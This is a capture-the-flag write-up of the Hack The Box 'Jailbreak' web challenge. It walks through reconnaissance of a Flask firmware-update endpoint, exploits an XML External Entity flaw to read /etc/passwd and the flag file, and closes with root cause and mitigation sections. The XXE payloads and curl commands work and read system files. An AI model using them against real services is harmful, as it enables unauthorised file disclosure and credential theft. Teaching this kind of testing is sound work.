# Hack The Box - Jailbreak (Very Easy)

## Overview

**Jailbreak** is a beginner-friendly Hack The Box web challenge focused on identifying and exploiting an XML External Entity (XXE) vulnerability.

The application simulates a Pip-Boy firmware update interface where users can submit XML configuration files to initiate a firmware upgrade. While the interface appears straightforward, accepting raw XML input immediately raises questions about how the backend processes user-supplied data.

The objective of this assessment was to analyze the application's functionality, identify any weaknesses in the XML processing logic, and determine whether sensitive files could be accessed through improper parser configuration.

Throughout this write-up, I'll walk through the methodology I used—from initial reconnaissance and source code analysis to vulnerability validation and successful exploitation—while also discussing why the vulnerability exists and how it can be mitigated.

---

## Reconnaissance

Before interacting with the application, I wanted to identify the exposed services and gather basic information about the target. Although the challenge could be accessed through the browser, performing a quick service enumeration helped confirm the underlying technology stack and identify any additional services that might be available.

I began by running an Nmap scan against the challenge instance.

```bash
nmap -Pn -sV -sC -p31025 <TARGET_IP>
```

### Scan Results

```
PORT      STATE SERVICE VERSION
31025/tcp open  http
Server: Werkzeug/3.0.3 Python/3.12.3
```

The scan confirmed that the challenge was running a web application served by **Werkzeug**, the development server commonly used with **Flask** applications written in Python.

Since only a single HTTP service was exposed, the remainder of the assessment focused on analyzing the web application and identifying any functionality that accepted user-controlled input.

## Initial Web Enumeration

With the initial reconnaissance complete, I shifted my focus to the web application itself. Rather than interacting with the interface manually, I first downloaded the homepage and inspected its source code for any references to API endpoints, firmware functionality, or JavaScript files that might reveal how the application worked behind the scenes.

```bash
curl http://<TARGET_IP>:31025/ -o index.html
grep -Ei "fetch|axios|api|rom|flash|upload|firmware|update" index.html
```

The search revealed a navigation entry pointing to the **ROM** page, which immediately stood out because the challenge description referenced modifying the device's firmware.

```html
<a class="nav-link" href="/rom">ROM</a>
```

At this stage, the ROM page appeared to be the most likely location for functionality related to firmware updates, so I continued my investigation there.

---

## Identifying Client-Side Resources

Before interacting with the firmware update page, I wanted to understand how the client communicated with the backend. A quick inspection of the homepage identified the JavaScript files loaded by the application.

```bash
curl http://<TARGET_IP>:31025/ | grep "<script"
```

Among the loaded resources was the following JavaScript file:

```text
/static/js/update.js
```

Since client-side JavaScript often exposes hidden API endpoints and request logic, I downloaded the file for further analysis.

```bash
curl http://<TARGET_IP>:31025/static/js/update.js -o update.js
cat update.js
```

Reviewing the source code revealed the exact endpoint responsible for handling firmware updates.

```javascript
fetch("/api/update", {
    method: "POST",
    headers: {
        "Content-Type": "application/xml",
    },
    body: xmlConfig
});
```

This immediately confirmed two important details:

- Firmware updates were submitted to the `/api/update` endpoint.
- The application accepted **raw XML** as user input.

Accepting XML input is often worth investigating because insecure XML parsers can introduce vulnerabilities such as XML External Entity (XXE) injection.

---

## Firmware Update Page

With the update endpoint identified, I inspected the firmware update page itself to understand how user input was collected.

```bash
curl -s http://<TARGET_IP>:31025/rom -o rom.html
cat rom.html
```

To determine whether the page relied on a traditional HTML form or JavaScript-based requests, I searched for common form elements.

```bash
grep -iE "<form|action=|input|type=file|multipart" rom.html
```

No traditional HTML form was present. Instead, the page contained a large text area pre-populated with an XML firmware configuration and relied entirely on JavaScript to submit the contents to the backend.

This confirmed that the XML document could be modified before being sent to the server, making it an ideal candidate for security testing.

---

## Endpoint Discovery

Although the firmware update functionality already looked promising, I performed a quick enumeration of several common application endpoints to ensure that no additional functionality had been exposed.

```bash
for p in rom upload firmware flash api admin debug console update download backup settings; do
    echo "==== $p ===="
    curl -s -o /dev/null -w "%{http_code}\n" http://<TARGET_IP>:31025/$p
done
```

Most of the tested endpoints returned **404 Not Found**, while the **ROM** page returned **200 OK**.

This suggested that the firmware update functionality represented the primary attack surface of the application.

---

## Establishing Baseline Behavior

Before attempting to exploit the application, I wanted to understand how it normally processed XML input. To do this, I created a minimal XML document containing only the required firmware information and submitted it to the update endpoint.

```bash
curl -i \
-H "Content-Type: application/xml" \
--data-binary @normal.xml \
http://<TARGET_IP>:31025/api/update
```

The server responded with the following JSON message:

```json
{
    "message": "Firmware version 1.33.7 update initiated."
}
```

The response echoed the contents of the `<Version>` element supplied in the XML document.

This behavior indicated that user-controlled XML data was parsed by the backend and incorporated directly into the server's response. Because the application accepted arbitrary XML and reflected parsed values back to the client, the next logical step was to determine whether the XML parser was vulnerable to **XML External Entity (XXE)** injection.

## XML External Entity (XXE) Testing

At this point, I had confirmed that the application accepted arbitrary XML input and reflected values from the submitted document in its response. Since XML parsers have historically been vulnerable to XML External Entity (XXE) attacks when external entity resolution is enabled, I decided to test whether the backend was securely configured.

Rather than immediately attempting to access sensitive files, I first used a harmless proof-of-concept payload that referenced the local `/etc/passwd` file. This is a common validation technique because the file exists on most Unix-like systems and provides a reliable way to determine whether external entities are being processed.

The following payload was created and saved as `xxe.xml`.

```xml
<?xml version="1.0"?>

<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<FirmwareUpdateConfig>
    <Firmware>
        <Version>&xxe;</Version>
    </Firmware>
</FirmwareUpdateConfig>
```

The payload was submitted to the firmware update endpoint.

```bash
curl -i \
-H "Content-Type: application/xml" \
--data-binary @xxe.xml \
http://<TARGET_IP>:31025/api/update
```

The response contained the contents of `/etc/passwd` within the `message` field.

```text
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
...
```

This confirmed that the XML parser was resolving external entities and that arbitrary local files could be read from the server.

The successful disclosure of `/etc/passwd` verified the presence of a classic **XML External Entity (XXE)** vulnerability. With the vulnerability confirmed, the next step was to access the target file identified in the challenge description.

## Exploitation

With the XXE vulnerability confirmed, the final step was to access the file specified in the challenge description. The original proof-of-concept payload was modified to reference `/flag.txt` instead of `/etc/passwd`.

The following XML payload was saved as `flag.xml`.

```xml
<?xml version="1.0"?>

<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///flag.txt">
]>

<FirmwareUpdateConfig>
    <Firmware>
        <Version>&xxe;</Version>
    </Firmware>
</FirmwareUpdateConfig>
```

The payload was submitted to the same firmware update endpoint.

```bash
curl -s \
-H "Content-Type: application/xml" \
--data-binary @flag.xml \
http://<TARGET_IP>:31025/api/update
```

To simplify the output and display only the returned message, I used `jq` to extract the JSON value.

```bash
curl -s \
-H "Content-Type: application/xml" \
--data-binary @flag.xml \
http://<TARGET_IP>:31025/api/update | jq -r .message
```

The application successfully processed the XML document and returned the contents of `/flag.txt` within the response message, confirming arbitrary local file disclosure through XML External Entity injection.

For this public write-up, the flag has been intentionally redacted.

```text
Firmware version HTB{REDACTED} update initiated.
```

Successfully retrieving the contents of `/flag.txt` completed the objective of the challenge.

## Root Cause Analysis

The vulnerability existed because the application accepted user-supplied XML and parsed it without disabling external entity resolution.

When the XML parser encountered the following declaration:

```xml
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

it interpreted the external entity as an instruction to load the contents of a local file from the server's filesystem.

Later, when the parser processed the `<Version>` element,

```xml
<Version>&xxe;</Version>
```

the entity reference was replaced with the contents of the referenced file before the application generated its response.

Because the backend reflected the parsed value directly in the JSON response, an attacker could retrieve arbitrary files simply by changing the file path referenced in the external entity.

The attack flow can be summarized as follows:

```text
User
 │
 │  XML Document
 ▼
POST /api/update
 │
 ▼
XML Parser
 │
 ├── Reads DOCTYPE declaration
 ├── Resolves external entity
 └── Loads local file
 │
 ▼
Application
 │
 └── Returns parsed value in JSON response
 │
 ▼
Sensitive file disclosed
```

Although this challenge was intentionally vulnerable, the same misconfiguration has affected real-world applications when XML parsers were left with insecure default settings.

The issue was not caused by the XML format itself, but by the parser being configured to trust external entities supplied by the client.

## Impact Assessment

Although this challenge was intentionally designed to demonstrate an XXE vulnerability, the impact of this type of flaw in a real-world application can be significant.

By exploiting the XML parser, I was able to read files directly from the server's filesystem without authentication or elevated privileges. In this case, the objective was to retrieve `/flag.txt`, but the same technique could potentially be used to access other sensitive resources if they were present.

Depending on the environment, an attacker could use XXE to:

- Read sensitive application files and configuration data.
- Expose credentials, API keys, or authentication tokens.
- Access system files that reveal information about the operating environment.
- Gather intelligence to support further attacks against the application or underlying infrastructure.
- In some parser configurations, leverage XXE to perform Server-Side Request Forgery (SSRF) against internal services.

The severity of an XXE vulnerability depends on how the XML parser is configured and what resources the application has permission to access. Even when direct code execution is not possible, arbitrary file disclosure alone can provide enough information to facilitate additional attacks.

In this challenge, the vulnerability was limited to local file disclosure, which was sufficient to achieve the objective by retrieving the target file from the server.

## Mitigation

Preventing XXE vulnerabilities is largely a matter of securely configuring the XML parser. Modern XML libraries typically provide options to disable external entity resolution and DTD processing, both of which significantly reduce the risk of XXE attacks.

Some recommended security practices include:

- Disable DTD (Document Type Definition) processing unless it is explicitly required.
- Disable the resolution of external entities.
- Validate XML input against a strict schema before processing.
- Apply the principle of least privilege so the application can only access files and resources that are necessary for its operation.
- Prefer simpler data formats, such as JSON, when XML is not required by the application.

In addition to secure parser configuration, developers should treat all user-supplied XML as untrusted input. Defensive coding practices, combined with regular security testing, can help identify and remediate XML-related vulnerabilities before they reach production environments.

Following these recommendations would have prevented the vulnerability demonstrated in this challenge by ensuring that external entities were ignored rather than processed.

## Lessons Learned

This challenge reinforced the importance of following a structured methodology during a web application assessment. Rather than immediately attempting to exploit the application, I began by identifying the exposed services, analyzing the client-side code, and understanding how the application processed user input.

Reviewing the JavaScript source proved especially valuable, as it revealed the `/api/update` endpoint and confirmed that firmware updates were submitted as raw XML. This insight helped narrow the attack surface and guided the remainder of the assessment.

Establishing a baseline response before testing for vulnerabilities also proved beneficial. By observing how the application handled a valid XML document, I was able to recognize that user-controlled values were reflected in the server's response. This behavior suggested that the XML parser was actively processing the submitted document and warranted further investigation.

Once the XXE vulnerability was confirmed using a harmless proof-of-concept payload, adapting the technique to access the target file became a straightforward process. Testing with `/etc/passwd` before attempting to read the challenge file provided confidence that the parser was resolving external entities and helped validate the vulnerability without making unnecessary assumptions.

Overall, this challenge demonstrated that seemingly simple features, such as a firmware update page, can expose critical vulnerabilities when user input is processed insecurely. It also highlighted the importance of understanding how data flows through an application rather than relying solely on automated tools.

Although the challenge was intentionally vulnerable for educational purposes, the techniques used here mirror those employed during real-world web application assessments. Careful enumeration, source code analysis, and methodical testing remain essential skills for identifying and validating security issues in modern applications.
